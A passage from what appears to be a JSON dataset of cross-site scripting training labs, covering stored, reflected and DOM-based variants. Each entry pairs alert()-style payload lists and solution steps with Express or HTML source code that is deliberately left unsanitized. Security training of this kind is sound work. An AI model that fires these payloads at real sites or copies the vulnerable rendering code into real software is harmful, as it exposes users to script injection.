    "Lab Description": "The forum application allows users to post messages that are stored on the server and later rendered on forum threads. The posts are not sanitized before display, letting attackers inject malicious scripts that persist across sessions.\nTo solve: Submit a forum post containing a payload and verify that it executes when the thread is viewed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new forum post using a payload like <script>alert('XSS')</script> via the web interface or Postman.",
      "Ensure that the post is stored in the forum database.",
      "Reload the forum thread and observe the execution of the payload.",
      "Attempt a variant payload using <svg/onload=alert(1)> to bypass filters.",
      "Confirm that the stored post triggers script execution on every page load."
    ],
    "payloads": [
      "<script>alert('Forum XSS')</script>",
      "<img src=x onerror=alert('Forum XSS')>",
      "<svg/onload=alert('Forum XSS')>",
      "<iframe src='javascript:alert(\"Forum XSS\")'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet forumPosts = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/forum', (req, res) => {\n  let postsHTML = forumPosts.map(post => `<p>${post}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Forum Posts</h2>\n        ${postsHTML}\n        <form action='/post' method='POST'>\n          <input type='text' name='post' placeholder='Your post'>\n          <button type='submit'>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/post', (req, res) => {\n  // Vulnerable: unsanitized forum post is stored and rendered\n  forumPosts.push(req.body.post);\n  res.redirect('/forum');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "DOM-based XSS via document.write in Widget Loader",
    "Lab Description": "A widget loader dynamically generates content using document.write based on a URL parameter. The parameter is not sanitized, allowing an attacker to supply a malicious payload that executes when the widget is loaded.\nTo solve: Modify the URL parameter to include a script payload and trigger its execution in the widget's output.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the widget loader page with a URL parameter, e.g., ?widget=<script>alert('XSS')</script>.",
      "Observe that the payload is injected via document.write and executed on page load.",
      "Test an alternative payload using an obfuscated version like <img src=x onerror=alert(1)> to bypass filters.",
      "Examine the source code to identify the vulnerable document.write call.",
      "Confirm that the payload executes in the browser context each time the widget is loaded."
    ],
    "payloads": [
      "<script>alert('Widget XSS')</script>",
      "<img src=x onerror=alert('Widget XSS')>",
      "<svg/onload=alert('Widget XSS')>",
      "<object data=\"javascript:alert('Widget XSS')\"></object>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/widget', (req, res) => {\n  const widgetParam = req.query.widget || 'Default Widget';\n  // Vulnerable: using document.write with unsanitized input\n  res.send(`\n    <html>\n      <body>\n        <h2>Widget Loader</h2>\n        <script>\n          document.write(unescape('${encodeURIComponent(widgetParam)}'));\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Mutation-based XSS in Dynamic Theme Editor",
    "Lab Description": "The application provides a dynamic theme editor that allows users to customize the website's appearance by updating CSS stored on the server. The editor applies the submitted CSS directly into a style tag without sanitization, permitting XSS via malicious CSS payloads.\nTo solve: Inject a CSS-based payload using mutation events that triggers JavaScript execution when the theme is applied.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a theme update via the theme editor with a payload in the CSS, e.g., body {background: url('x');} and append a malicious attribute using a data URI with JavaScript.",
      "Use Burp Suite to modify the theme submission request if needed.",
      "Reload the page and observe the theme being applied unsafely.",
      "Craft an alternative payload using a mutation event, e.g., a payload that leverages expression() in older browsers or a data URI.",
      "Confirm that the payload results in script execution upon theme load."
    ],
    "payloads": [
      "<script>alert('Theme XSS')</script>",
      "<img src=x onerror=alert('Theme XSS')>",
      "<svg/onload=alert('Theme XSS')>",
      "<object data=\"javascript:alert('Theme XSS')\"></object>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet themeCSS = 'body { background: #fff; }';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/theme', (req, res) => {\n  res.send(`\n    <html>\n      <head>\n        <style>${themeCSS}</style>\n      </head>\n      <body>\n        <h2>Dynamic Theme Editor</h2>\n        <form action='/theme-update' method='POST'>\n          <textarea name='css' placeholder='Enter custom CSS'></textarea>\n          <button type='submit'>Update Theme</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/theme-update', (req, res) => {\n  // Vulnerable: saving unsanitized CSS input directly\n  themeCSS = req.body.css;\n  res.redirect('/theme');\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in Search Query Parameter",
    "Lab Description": "The application provides a search feature where user input is reflected back into the page without proper sanitization. Attackers can inject scripts through the search parameter to achieve XSS.\nTo solve: Craft a malicious payload in the search query and observe if it executes on the response page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to the search page and observe the URL format: /search?q=term",
      "Inject a payload such as <script>alert(1)</script> in the q parameter",
      "Reload the page and check if the script executes",
      "Try alternate payloads like <img src=x onerror=alert(1)> or <svg/onload=alert(1)>"
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "\"><script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const query = req.query.q || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Search Results for: ${query}</h2>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Server running'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Product Review System",
    "Lab Description": "Users can leave reviews on product pages. The application does not sanitize or escape the user-submitted content before rendering it, leading to stored XSS.\nTo solve: Submit a malicious script in the review form and revisit the product page to confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to a product page and submit a new review with a script payload",
      "Use <script>alert('XSS')</script> or similar",
      "Reload the product page and see if the script executes",
      "Try different vectors such as <img src=x onerror=alert(1)>"
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product', (req, res) => {\n  const reviewHtml = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Product Page</h2>\n        ${reviewHtml}\n        <form action='/review' method='POST'>\n          <textarea name='comment'></textarea>\n          <button type='submit'>Submit Review</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/review', (req, res) => {\n  reviews.push(req.body.comment);\n  res.redirect('/product');\n});\n\napp.listen(3000, () => console.log('Running on port 3000'));\n"
  },
  {
    "Lab scenario": "DOM-based XSS in Location Hash",
    "Lab Description": "The application uses `location.hash` to dynamically update content on the page without sanitization. This allows attackers to inject scripts that execute when the hash is processed.\nTo solve: Inject a script payload into the URL hash and observe its execution in the page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /dom-xss.html#<payload>",
      "Observe the innerHTML sink updating the page using the hash value",
      "Use a payload like #<img src=x onerror=alert(1)>",
      "Confirm that the script executes upon loading"
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert(1)</script>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('DOM XSS Lab running'));\n\n// public/dom-xss.html\n// <html>\n//   <body>\n//     <h2>Welcome</h2>\n//     <div id=\"output\"></div>\n//     <script>\n//       document.getElementById('output').innerHTML = location.hash.substring(1);\n//     </script>\n//   </body>\n// </html>\n"
  },
  {
    "Lab scenario": "Stored XSS in User Profile Bio",
    "Lab Description": "Users can update their profile bio. The application displays this information without escaping HTML content, leading to persistent XSS on profile pages.\nTo solve: Insert a payload in the bio field and revisit your profile page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to the profile settings page",
      "Update the bio field with <script>alert('bio')</script>",
      "Save the profile and revisit the profile page",
      "Observe execution of the script"
    ],
    "payloads": [
      "<script>alert('bio')</script>",
      "<img src=x onerror=alert('bio')>",
      "<svg/onload=alert('bio')>",
      "<iframe src='javascript:alert(\"bio\")'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userProfile = { bio: 'This is my bio.' };\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <p>${userProfile.bio}</p>\n        <form action='/update-bio' method='POST'>\n          <textarea name='bio'></textarea>\n          <button type='submit'>Update Bio</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update-bio', (req, res) => {\n  userProfile.bio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Profile XSS running'));\n"
  },
  {
    "Lab scenario": "XSS via JavaScript URL in HREF Attribute",
    "Lab Description": "The application includes user-controlled links using anchor tags where the href is directly set to user input. This allows attackers to inject `javascript:` URLs to execute code when the link is clicked.\nTo solve: Inject a `javascript:` payload and click the link to confirm execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit the vulnerable page that displays user-submitted links",
      "Submit a malicious link with href=javascript:alert(1)",
      "Click on the rendered link to trigger the payload",
      "Try alternate payloads with encoding to bypass filters"
    ],
    "payloads": [
      "javascript:alert(1)",
      "JaVaScRiPt:alert(1)",
      "javascript:confirm(1)",
      "data:text/html,<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userLink = '#';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/link', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Your Custom Link</h2>\n        <a href=\"${userLink}\">Click Me</a>\n        <form action='/link-update' method='POST'>\n          <input name='url' placeholder='Enter a URL'>\n          <button type='submit'>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/link-update', (req, res) => {\n  userLink = req.body.url;\n  res.redirect('/link');\n});\n\napp.listen(3000, () => console.log('JavaScript URI XSS lab running'));\n"
  },
  {
    "Lab scenario": "XSS in Client-Side Comment Preview Feature",
    "Lab Description": "The application has a live comment preview implemented entirely on the client-side. User input is inserted into the DOM using `innerHTML` without sanitization, allowing for DOM-based XSS.\nTo solve: Inject a payload in the comment box and observe the live preview triggering script execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the comment section with live preview enabled",
      "Type an XSS payload like <img src=x onerror=alert(1)>",
      "Observe if it executes in the preview panel",
      "Try variations using <svg>, <script>, or <iframe>"
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert('preview')</script>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('Preview XSS lab running'));\n\n// public/preview.html\n// <html>\n//   <body>\n//     <h2>Leave a Comment</h2>\n//     <textarea id=\"comment\"></textarea>\n//     <div id=\"preview\"></div>\n//     <script>\n//       document.getElementById('comment').addEventListener('input', function(e) {\n//         document.getElementById('preview').innerHTML = e.target.value;\n//       });\n//     </script>\n//   </body>\n// </html>\n"
  },
  {
    "Lab scenario": "Stored XSS in Admin Feedback Viewer",
    "Lab Description": "Users can submit feedback via a contact form. The feedback is stored and later viewed by an admin. Since the admin interface renders raw HTML from stored feedback, it's vulnerable to stored XSS.\nTo solve: Submit a feedback with a payload and wait for the admin to view it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit a feedback message like <script>alert('admin')</script>",
      "Access the admin interface to view submitted feedback",
      "Observe if the script executes when admin opens the page",
      "Confirm it\u00e2\u20ac\u2122s stored and triggered only on admin-side"
    ],
    "payloads": [
      "<script>alert('admin')</script>",
      "<img src=x onerror=alert('admin')>",
      "<svg/onload=alert('admin')>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet feedbacks = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/contact', (req, res) => {\n  res.send(`\n    <form action='/submit-feedback' method='POST'>\n      <textarea name='msg'></textarea>\n      <button type='submit'>Send</button>\n    </form>\n  `);\n});\n\napp.post('/submit-feedback', (req, res) => {\n  feedbacks.push(req.body.msg);\n  res.redirect('/contact');\n});\n\napp.get('/admin/feedbacks', (req, res) => {\n  const allFeedback = feedbacks.map(f => `<div>${f}</div>`).join('');\n  res.send(`<html><body>${allFeedback}</body></html>`);\n});\n\napp.listen(3000, () => console.log('Admin feedback lab running'));\n"
  },
  {
    "Lab scenario": "XSS in Unescaped Error Message",
    "Lab Description": "The application displays error messages using unsanitized user input. If the user submits malformed input, it is echoed in the error output, enabling reflected XSS.\nTo solve: Trigger an error that includes a payload in the message.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit a request with a malformed parameter like /error?msg=<script>alert(1)</script>",
      "Observe if the error page reflects the message unsafely",
      "Try different payloads including <img src=x onerror=alert(1)>"
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "\"><script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/error', (req, res) => {\n  const msg = req.query.msg || 'Unknown error';\n  res.send(`<html><body><h2>Error: ${msg}</h2></body></html>`);\n});\n\napp.listen(3000, () => console.log('Error XSS lab running'));\n"
  },
  {
    "Lab scenario": "DOM XSS via Unescaped URL Parameter in Template",
    "Lab Description": "The application loads a `title` parameter from the URL and inserts it directly into a DOM template using `innerHTML`. If not escaped, this allows DOM-based XSS via the `title` parameter.\nTo solve: Inject a payload into the title parameter and confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access /template.html?title=<img src=x onerror=alert(1)>",
      "View how the template injects the title",
      "Try encoded and alternate payloads to bypass filters",
      "Observe script execution"
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<script>alert(1)</script>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\nconst path = require('path');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.listen(3000, () => console.log('Template XSS lab running'));\n\n// public/template.html\n// <html>\n//   <body>\n//     <div id=\"title\"></div>\n//     <script>\n//       const params = new URLSearchParams(window.location.search);\n//       const title = params.get('title') || 'Default';\n//       document.getElementById('title').innerHTML = title;\n//     </script>\n//   </body>\n// </html>\n"
  },
  {
    "Lab scenario": "XSS via File Name in File Upload Confirmation Page",
    "Lab Description": "When users upload a file, the server reflects the original filename back into the confirmation message without sanitization. This allows attackers to upload files with malicious names containing XSS payloads.\nTo solve: Upload a file with a filename containing a script and confirm that it executes on the confirmation page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Prepare a file named <script>alert(1)</script>.txt",
      "Upload it through the upload form",
      "View the confirmation page showing the uploaded filename",
      "Check if the script executes"
    ],
    "payloads": [
      "<script>alert(1)</script>.txt",
      "<img src=x onerror=alert(1)>.jpg",
      "<svg/onload=alert(1)>.svg",
      "\"><script>alert(1)</script>.png"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\n\nconst storage = multer.memoryStorage();\nconst upload = multer({ storage });\n\napp.get('/upload', (req, res) => {\n  res.send(`<form action='/upload' method='POST' enctype='multipart/form-data'>\n    <input type='file' name='file'>\n    <button type='submit'>Upload</button>\n  </form>`);\n});\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const fileName = req.file.originalname;\n  res.send(`<h2>Uploaded: ${fileName}</h2>`);\n});\n\napp.listen(3000, () => console.log('File upload XSS lab running'));\n"
  },
  {
    "Lab scenario": "Reflected XSS via Search Query Parameter",
    "Lab Description": "The application has a search functionality that reflects user input directly into the results page without encoding or sanitization. An attacker can inject malicious scripts via the search query.\nTo solve: Inject a payload in the search parameter and confirm its execution in the results page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /search?q=<script>alert(1)</script>",
      "Observe if the payload is reflected on the page",
      "Try variations with <img>, <svg> and encoded characters"
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  res.send(`<html><body><h3>Results for: ${q}</h3></body></html>`);\n});\n\napp.listen(3000, () => console.log('Search XSS lab running'));\n"
  },
  {
    "Lab scenario": "Stored XSS in User Profile Bio",
    "Lab Description": "Users can update their profile including a 'bio' field. The bio is displayed on their public profile page without escaping HTML. An attacker can store a payload in the bio that executes whenever someone views their profile.\nTo solve: Submit a malicious bio and visit the profile to confirm execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /edit-profile and input <script>alert(1)</script> in the bio field",
      "Submit the form and go to /user/me",
      "Observe if the script executes on the profile page"
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/edit-profile', (req, res) => {\n  res.send(`<form method='POST' action='/update-profile'>\n    <textarea name='bio'></textarea>\n    <button type='submit'>Save</button>\n  </form>`);\n});\n\napp.post('/update-profile', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/user/me');\n});\n\napp.get('/user/me', (req, res) => {\n  res.send(`<h3>User Profile</h3><div>${userBio}</div>`);\n});\n\napp.listen(3000, () => console.log('Profile XSS lab running'));\n"
  },
  {
    "Lab scenario": "XSS in JavaScript Context via URL Parameter",
    "Lab Description": "The page dynamically sets a JavaScript variable using a URL parameter without proper sanitization. Injecting unescaped characters allows breaking out of the script context and executing arbitrary code.\nTo solve: Inject a payload that escapes the JavaScript string and executes your code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access /page?name=xyz and inspect the page source",
      "Try /page?name=';alert(1)//",
      "Observe if alert box is triggered due to injected code"
    ],
    "payloads": [
      "';alert(1)//",
      "';confirm(1)//",
      "'-alert(1)-'",
      "'+alert(1)+'"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/page', (req, res) => {\n  const name = req.query.name || 'Guest';\n  res.send(`\n    <html>\n      <body>\n        <script>\n          var user = '${name}';\n          document.write('Hello ' + user);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('JS Context XSS lab running'));\n"
  },
  {
    "Lab scenario": "DOM XSS via Fragment Identifier Injection",
    "Lab Description": "The page uses JavaScript to read the URL fragment (`location.hash`) and inserts it into the page using `innerHTML`. This allows attackers to craft a malicious link that executes code when opened.\nTo solve: Craft a URL with a malicious hash and verify code execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open /hash.html#<img src=x onerror=alert(1)>",
      "Observe how the page handles the hash value",
      "Confirm if the script executes due to unsafe DOM insertion"
    ],
    "payloads": [
      "#<img src=x onerror=alert(1)>",
      "#<script>alert(1)</script>",
      "#<svg/onload=alert(1)>",
      "#<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "// hash.html\n<html>\n  <body>\n    <div id='output'></div>\n    <script>\n      document.getElementById('output').innerHTML = location.hash.substring(1);\n    </script>\n  </body>\n</html>\n"
  },
  {
    "Lab scenario": "XSS in Product Review Rendering",
    "Lab Description": "Users can leave reviews on products. These reviews are displayed on the product page without sanitization. Malicious users can inject HTML/JavaScript into the review content.\nTo solve: Submit a review containing a script and reload the product page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to /product/1/review and submit a payload like <script>alert(1)</script>",
      "Visit the product page /product/1 to check if it executes",
      "Try different payloads in case of filtering"
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet reviews = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/product/1', (req, res) => {\n  const allReviews = reviews.map(r => `<p>${r}</p>`).join('');\n  res.send(`<h1>Product 1</h1>${allReviews}<a href='/product/1/review'>Leave a review</a>`);\n});\n\napp.get('/product/1/review', (req, res) => {\n  res.send(`<form method='POST'><textarea name='review'></textarea><button>Submit</button></form>`);\n});\n\napp.post('/product/1/review', (req, res) => {\n  reviews.push(req.body.review);\n  res.redirect('/product/1');\n});\n\napp.listen(3000, () => console.log('Review XSS lab running'));\n"
  },
  {
    "Lab scenario": "XSS in JSON Response Rendered via innerHTML",
    "Lab Description": "The application fetches a user profile via JSON and renders fields like 'nickname' using `innerHTML`. A malicious user can inject a script in their nickname, which is then executed when another user views the profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Register a new user with the nickname field set to <img src=x onerror=alert('XSS')>",
      "Login as another user and visit the malicious user\u00e2\u20ac\u2122s profile",
      "Observe the script execution from the JSON-rendered nickname"
    ],
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>",
      "<script>alert('XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "// profile.html\n<html>\n  <body>\n    <div id='nickname'></div>\n    <script>\n      fetch('/api/user/evil')\n        .then(res => res.json())\n        .then(data => {\n          document.getElementById('nickname').innerHTML = data.nickname;\n        });\n    </script>\n  </body>\n</html>\n\n// Express endpoint\nconst express = require('express');\nconst app = express();\n\napp.get('/api/user/evil', (req, res) => {\n  res.json({ nickname: \"<img src=x onerror=alert('XSS')>\" });\n});\n\napp.listen(3000, () => console.log('JSON XSS lab running'));\n"
  },
  {
    "Lab scenario": "XSS in Comment Section with Markdown Parsing",
    "Lab Description": "The app allows Markdown-formatted comments but doesn\u00e2\u20ac\u2122t properly sanitize embedded HTML. Attackers can bypass Markdown rendering with raw HTML containing XSS payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Post a comment like <script>alert(1)</script> in Markdown input",
      "Visit the blog page and confirm if the payload executes",
      "Test HTML embedded inside Markdown if initial payloads are filtered"
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<iframe src='javascript:alert(1)'></iframe>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst marked = require('marked');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/post', (req, res) => {\n  const rendered = comments.map(c => marked(c)).join('<hr>');\n  res.send(`<h1>Blog Post</h1>${rendered}<form method='POST'><textarea name='comment'></textarea><button>Submit</button></form>`);\n});\n\napp.post('/post', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/post');\n});\n\napp.listen(3000, () => console.log('Markdown XSS lab running'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Support Ticket System",
    "Lab Description": "Users can submit support tickets with titles and descriptions. These values are later reviewed by admins. The input is rendered without encoding, allowing attackers to inject stored XSS payloads into ticket fields.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a ticket with a title or description like <img src=x onerror=alert('Admin')>",
      "Wait or simulate an admin visiting the ticket view page",
      "Check for XSS execution"
    ],
    "payloads": [
      "<img src=x onerror=alert('Admin')>",
      "<svg/onload=alert('XSS')>",
      "<script>alert('Stored')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet tickets = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/submit-ticket', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='title' placeholder='Title'>\n    <textarea name='desc'></textarea>\n    <button>Submit</button>\n  </form>`);\n});\n\napp.post('/submit-ticket', (req, res) => {\n  tickets.push({ title: req.body.title, desc: req.body.desc });\n  res.redirect('/admin/tickets');\n});\n\napp.get('/admin/tickets', (req, res) => {\n  const view = tickets.map(t => `<h3>${t.title}</h3><p>${t.desc}</p>`).join('<hr>');\n  res.send(`<h1>All Tickets</h1>${view}`);\n});\n\napp.listen(3000, () => console.log('Support Ticket XSS lab running'));\n"
  },
  {
    "Lab scenario": "XSS via Event Handler Injection in User Settings",
    "Lab Description": "The app displays user settings including a customizable profile badge with attributes like color and label. Input is reflected in HTML attributes without validation, allowing injection of `onmouseover`, `onclick`, etc.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to /settings and set badge label to <div onmouseover=alert(1)>Hover me</div>",
      "Save changes and view the badge",
      "Hover to trigger the script"
    ],
    "payloads": [
      "<div onmouseover=alert(1)>Hover me</div>",
      "<button onclick=alert(1)>Click</button>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBadge = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/settings', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='badge' placeholder='Badge HTML'>\n    <button>Save</button>\n  </form>`);\n});\n\napp.post('/settings', (req, res) => {\n  userBadge = req.body.badge;\n  res.redirect('/me');\n});\n\napp.get('/me', (req, res) => {\n  res.send(`<h1>Your Profile</h1>${userBadge}`);\n});\n\napp.listen(3000, () => console.log('Badge XSS lab running'));\n"
  },
  {
    "Lab scenario": "DOM XSS in History PushState Injection",
    "Lab Description": "The page uses `history.pushState` to change the visible URL and then updates part of the DOM using the value of `location.pathname`. An attacker can inject crafted content into the DOM by manipulating the path.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /fakepath/<img src=x onerror=alert(1)>",
      "Check how `innerHTML` is being updated based on `location.pathname`",
      "Confirm XSS triggers via pathname injection"
    ],
    "payloads": [
      "/<img src=x onerror=alert(1)>",
      "/<svg/onload=alert(1)>",
      "/<script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "// domxss.html\n<html>\n  <body>\n    <div id='page'></div>\n    <script>\n      history.pushState({}, '', location.pathname);\n      document.getElementById('page').innerHTML = location.pathname.substring(1);\n    </script>\n  </body>\n</html>\n"
  },
  {
    "Lab scenario": "Reflected XSS via Error Message Parameter",
    "Lab Description": "The application reflects an error message from a query parameter directly into the page without sanitization. Attackers can inject JavaScript payloads through the `error` query string.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /login?error=<script>alert('XSS')</script>",
      "Observe the reflected error message displayed on the page",
      "Confirm if JavaScript executes"
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  const error = req.query.error || '';\n  res.send(`\n    <html>\n      <body>\n        <h2>Login Page</h2>\n        ${error ? `<p style='color:red'>${error}</p>` : ''}\n        <form method='POST'><input name='user'><input name='pass' type='password'><button>Login</button></form>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Reflected XSS lab running'));\n"
  },
  {
    "Lab scenario": "DOM XSS via Location Hash Injection",
    "Lab Description": "The app uses `location.hash` to dynamically insert content into the page using `innerHTML`. This allows attackers to trigger XSS by modifying the fragment identifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /#<img src=x onerror=alert(1)>",
      "Check if the fragment is parsed and rendered using innerHTML",
      "Confirm script execution upon page load"
    ],
    "payloads": [
      "#<script>alert(1)</script>",
      "#<svg/onload=alert(1)>",
      "#<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "<html>\n  <body>\n    <div id='output'></div>\n    <script>\n      document.getElementById('output').innerHTML = decodeURIComponent(location.hash.substring(1));\n    </script>\n  </body>\n</html>\n"
  },
  {
    "Lab scenario": "XSS in Search Autocomplete Suggestions",
    "Lab Description": "The search feature displays autocomplete suggestions fetched from the server and rendered using `innerHTML`. Malicious input from the query is reflected without sanitization.",
    "Difficulty Level": "Hard",
